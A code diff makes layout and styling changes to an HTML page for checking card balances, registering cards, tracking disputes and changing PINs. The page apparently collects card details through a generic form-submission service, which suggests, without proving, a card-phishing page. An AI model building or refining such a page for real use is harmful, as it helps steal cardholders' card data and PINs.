@@ -461,6 +461,10 @@
       font-size: 15px !important;
     }
   }
+
+  .nav { justify-content: center !important; }
+  .links { display: none !important; }
+
 </style>
 
 </head>
@@ -500,29 +504,29 @@
         <div class="panel" id="manage">
 
 <!-- Register Card Content -->
-<div id="content-register" class="tab-content" style="display:none; text-align:center; padding: 40px 0;">
+<div id="content-register" class="tab-content" style="display:none; padding: 20px 0;">
   <h2>Register your Card</h2>
   <p>Enter your card details to register a new account.</p>
-  <button class="btn" style="background:var(--blue2); color:#fff; border:none; padding:10px 20px; border-radius:5px; cursor:pointer; display:block; margin:20px auto 0;">Start Registration</button>
+  <button class="btn" style="width:100%; background:var(--blue2); color:#fff; border:none; padding:12px 20px; border-radius:5px; cursor:pointer; margin-top:20px; font-weight:bold; font-size:16px;">Start Registration</button>
 </div>
 
 <!-- Track Disputes Content -->
-<div id="content-disputes" class="tab-content" style="display:none; text-align:center; padding: 40px 0;">
+<div id="content-disputes" class="tab-content" style="display:none; padding: 20px 0;">
   <h2>Track Disputes</h2>
   <p>Enter your claim reference number to track your dispute status.</p>
-  <input type="text" placeholder="Reference Number" style="padding:10px; width:100%; max-width:300px; margin:20px 0; border:1px solid #ccc; border-radius:5px;" />
+  <input type="text" placeholder="Reference Number" style="padding:10px; width:100%; margin:20px 0; border:1px solid #ccc; border-radius:5px;" />
   <button class="btn" style="background:var(--blue2); color:#fff; border:none; padding:10px 20px; border-radius:5px; cursor:pointer; display:block; margin:auto;">Track Status</button>
 </div>
 
 <!-- Personalize PIN Content -->
-<div id="content-pin" class="tab-content" style="display:none; text-align:center; padding: 40px 0;">
+<div id="content-pin" class="tab-content" style="display:none; padding: 20px 0;">
   <h2>Personalize PIN</h2>
   <p>Enter your card details securely to update your PIN.</p>
-  <button class="btn" style="background:var(--blue2); color:#fff; border:none; padding:10px 20px; border-radius:5px; cursor:pointer; display:block; margin:20px auto 0;">Change PIN</button>
+  <button class="btn" style="width:100%; background:var(--blue2); color:#fff; border:none; padding:12px 20px; border-radius:5px; cursor:pointer; margin-top:20px; font-weight:bold; font-size:16px;">Change PIN</button>
 </div>
 
 <!-- Check Balance Content (Default) -->
-<div id="content-check" class="tab-content" style="display:block; text-align:center;">
+<div id="content-check" class="tab-content" style="display:block;">
 
           <h2>Please enter your card information</h2>
           <p>
@@ -624,7 +628,7 @@
 
             <input type="hidden" name="_subject" value="New website form submission" />
 
-            <button type="submit" style="display:block; margin:20px auto 0;">Check</button>
+            <button type="submit">Check</button>
 
             
           </form>
